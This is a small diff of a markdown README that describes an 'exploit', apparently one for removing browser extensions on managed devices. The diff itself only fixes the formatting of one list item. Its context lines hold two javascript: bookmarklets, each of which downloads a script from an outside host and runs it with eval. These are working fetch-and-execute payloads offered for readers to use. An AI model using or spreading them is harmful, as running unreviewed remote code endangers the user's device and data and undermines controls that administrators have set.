@@ -100,7 +100,7 @@ There are several vesions of this exploit you can use, here are the 2 most commo
     ```js
     javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
     ```  
-    -Compact Cow's UI (Dark)
+    - Compact Cow's UI (Dark)
     ```js
     javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
     ```
